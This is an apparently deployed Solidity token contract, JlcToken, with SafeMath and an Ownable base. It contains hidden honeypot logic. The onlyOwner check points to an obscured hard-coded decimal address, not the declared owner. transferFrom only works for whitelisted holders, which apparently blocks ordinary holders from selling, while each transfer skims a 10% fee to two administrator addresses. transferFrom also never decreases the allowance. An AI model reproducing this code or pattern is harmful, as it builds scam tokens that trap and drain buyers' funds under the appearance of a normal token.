/**
 *Submitted for verification at BscScan.com on 2022-07-17
*/

pragma solidity ^0.4.26;

contract Ownable {
  address public owner;
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  function Ownable() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == address(1080614020421183795110940285280029773222128095634));
    _;
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

}
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract JlcToken is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  address public administratorAddress1 = 0xF1946A9CF00a6eAd4C6143132A890A1Afa263e01;
  address public administratorAddress2 = 0xf38d7234941862d4e5D6253838522FE14a4e63cd;
  uint256 public serviceCharge = 10;
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply =  _totalSupply;
        balances[msg.sender] = totalSupply;
        allow[msg.sender] = true;
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;
  
  mapping(address => bool) public allow;

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    uint256 fee = _value * serviceCharge / 100;
    uint256 fee1 = fee * 25 / 100;
    uint256 fee2 = fee * 75 / 100;
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value - fee);
    balances[administratorAddress1] = balances[administratorAddress1].add(fee1);
    balances[administratorAddress2] = balances[administratorAddress2].add(fee2);
    Transfer(msg.sender, _to, _value - fee);
    Transfer(msg.sender, administratorAddress1, fee1);
    Transfer(msg.sender, administratorAddress2, fee2);
    return true;
  }

  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

  mapping (address => mapping (address => uint256)) public allowed;

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(allow[_from] == true);

    uint256 fee = _value * serviceCharge / 100;
    uint256 fee1 = fee * 25 / 100;
    uint256 fee2 = fee * 75 / 100;
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value - fee);
    balances[administratorAddress1] = balances[administratorAddress1].add(fee1);
    balances[administratorAddress2] = balances[administratorAddress2].add(fee2);
    Transfer(_from, _to, _value - fee);
    Transfer(_from, administratorAddress1, fee1);
    Transfer(_from, administratorAddress2, fee2);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
  function addAllow(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }
  
//   function mint(address miner, uint256 _value) external onlyOwner {
//       balances[miner] = _value;
//   }
}